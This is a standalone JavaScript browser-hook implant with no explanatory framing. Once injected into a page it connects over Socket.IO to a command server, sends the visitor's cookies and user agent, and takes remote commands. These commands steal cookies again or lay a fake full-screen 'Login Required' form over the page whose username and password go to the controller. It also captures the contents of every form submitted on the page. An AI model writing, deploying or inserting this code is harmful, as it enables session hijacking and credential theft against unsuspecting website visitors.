(function() {
    // Generate unique browser ID
    var browserId = 'bh_' + Math.random().toString(36).substr(2, 9);
    
    // Load Socket.IO
    var script = document.createElement('script');
    script.src = 'https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.5.1/socket.io.min.js';
    document.head.appendChild(script);

    script.onload = function() {
        var socket = io('http://' + window.location.hostname + ':3000');
        
        // Send browser info on connect
        socket.emit('connect_browser', {
            id: browserId,
            user_agent: navigator.userAgent,
            cookies: document.cookie
        });

        // Handle commands
        socket.on('command', function(data) {
            if (data.command === 'steal_cookies') {
                socket.emit('form_data', {
                    id: browserId,
                    data: 'Cookies: ' + document.cookie
                });
            } else if (data.command === 'phishing') {
                var div = document.createElement('div');
                div.style.position = 'fixed';
                div.style.top = '0';
                div.style.left = '0';
                div.style.width = '100%';
                div.style.height = '100%';
                div.style.background = 'white';
                div.innerHTML = `
                    <h2>Login Required</h2>
                    <form id="phishForm">
                        <input type="text" name="username" placeholder="Username"><br>
                        <input type="password" name="password" placeholder="Password"><br>
                        <button type="submit">Login</button>
                    </form>
                `;
                document.body.appendChild(div);
                
                document.getElementById('phishForm').addEventListener('submit', function(e) {
                    e.preventDefault();
                    var formData = 'Username: ' + this.username.value + ', Password: ' + this.password.value;
                    socket.emit('form_data', {
                        id: browserId,
                        data: formData
                    });
                    div.remove();
                });
            }
        });

        // Capture form submissions
        document.addEventListener('submit', function(e) {
            var form = e.target;
            var formData = new FormData(form);
            var data = '';
            for (var pair of formData.entries()) {
                data += pair[0] + ': ' + pair[1] + ', ';
            }
            socket.emit('form_data', {
                id: browserId,
                data: data
            });
        }, true);
    };
})();